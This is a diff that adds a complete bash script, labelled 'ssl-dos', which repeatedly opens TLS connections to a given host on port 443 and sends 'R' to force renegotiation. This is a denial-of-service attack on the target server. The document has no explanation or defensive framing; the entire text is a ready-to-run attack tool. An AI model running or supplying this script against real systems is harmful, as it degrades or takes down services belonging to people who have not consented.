@@ -1,0 +1,13 @@
+echo "Usage: ./ssl-dos IP COUNT"
+echo "Attacking host: $1 with $2 requests"
+echo
+read -sn 1 -p "Press any key to continue..."
+
+for i in `seq 1 $2`;
+do
+clear
+echo "*********************************** REQUEST # $i"
+echo
+echo R | openssl s_client -connect $1:443 2>/dev/null;
+COUNT=`expr $COUNT + 1`
+done
